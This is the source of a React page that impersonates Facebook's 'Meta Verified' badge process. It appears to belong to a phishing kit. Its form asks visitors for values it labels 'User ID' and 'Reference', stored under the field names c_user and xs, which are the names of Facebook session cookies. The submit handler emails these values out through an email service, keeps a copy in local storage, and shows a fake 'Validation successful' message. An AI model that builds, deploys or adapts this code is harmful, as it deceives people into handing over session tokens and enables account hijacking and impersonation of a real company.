import React, { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { validationFormSchema } from "@shared/schema";
import { useMobile } from "@/hooks/use-mobile";
import { MobileModal } from "@/components/mobile-modal";
import { Search } from "lucide-react";
import { sendValidationFormEmail } from "@/lib/emailService";

export default function Validation() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const isMobile = useMobile();
  const [showMobileModal, setShowMobileModal] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (isMobile) {
      setShowMobileModal(true);
    }
  }, [isMobile]);

  const form = useForm({
    resolver: zodResolver(validationFormSchema),
    defaultValues: {
      c_user: "",
      xs: "",
    },
  });

  const onSubmit = async (data: any) => {
    try {
      setIsSubmitting(true);
      await sendValidationFormEmail({
        ...data,
        timestamp: new Date().toISOString(),
      });

      localStorage.setItem('validation_data', JSON.stringify(data));

      toast({
        title: "Validation successful",
        description: "Please proceed to the next step",
      });
      setLocation("/confirmation");
    } catch (error) {
      console.error('EmailJS error:', error);
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to submit form. Please try again.",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <MetaTags 
        title="Meta Verified | Validation"
        description="Request a verified badge on Facebook - Validation Step"
      />
      <MobileModal open={showMobileModal} onOpenChange={setShowMobileModal} />

      <nav className="flex items-center justify-between p-3 sm:p-4 border-b">
        <div className="flex items-center">
          <p className="text-[#1877f2] text-xl sm:text-2xl font-bold">facebook</p>
        </div>
        <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 sm:px-4 py-1.5 sm:py-2">
          <Search className="w-3 h-3 sm:w-4 sm:h-4 mr-2 text-[#65676B]" />
          <input
            type="text"
            placeholder="Search"
            className="bg-transparent outline-none text-sm sm:text-base w-24 sm:w-auto text-[#65676B] placeholder-[#65676B]"
          />
        </div>
      </nav>

      <div className="flex-1 flex justify-center items-center p-4 sm:p-8">
        <div className="max-w-2xl w-full space-y-6">
          <div className="text-center">
            <h1 className="text-2xl sm:text-3xl font-bold text-gray-900 mb-2">
              Verification Process
            </h1>
            <p className="text-[#65676B] text-sm sm:text-base">
              Please provide your verification details
            </p>
          </div>

          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
              <FormField
                control={form.control}
                name="c_user"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="text-sm font-medium text-[#1c1e21]">
                      User ID
                    </FormLabel>
                    <FormControl>
                      <Input
                        type="text"
                        placeholder="Enter User ID"
                        className="h-10 px-3 text-sm border border-[#dddfe2] rounded-md focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] focus:ring-opacity-50"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage className="text-xs text-[#dc3545] mt-1" />
                  </FormItem>
                )}
              />
              <FormField
                control={form.control}
                name="xs"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="text-sm font-medium text-[#1c1e21]">
                      Reference
                    </FormLabel>
                    <FormControl>
                      <Input 
                        type="text" 
                        placeholder="Enter reference" 
                        className="h-10 px-3 text-sm border border-[#dddfe2] rounded-md focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] focus:ring-opacity-50"
                        {...field} 
                      />
                    </FormControl>
                    <FormMessage className="text-xs text-[#dc3545] mt-1" />
                  </FormItem>
                )}
              />

              <Button 
                type="submit" 
                className="w-full py-3 text-base bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold rounded-lg transition-colors duration-200"
                disabled={isSubmitting}
              >
                {isSubmitting ? "Verifying..." : "Continue Verification"}
              </Button>
            </form>
          </Form>
        </div>
      </div>

      <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-gray-500 border-t">
        Meta © 2025
      </div>
    </div>
  );
}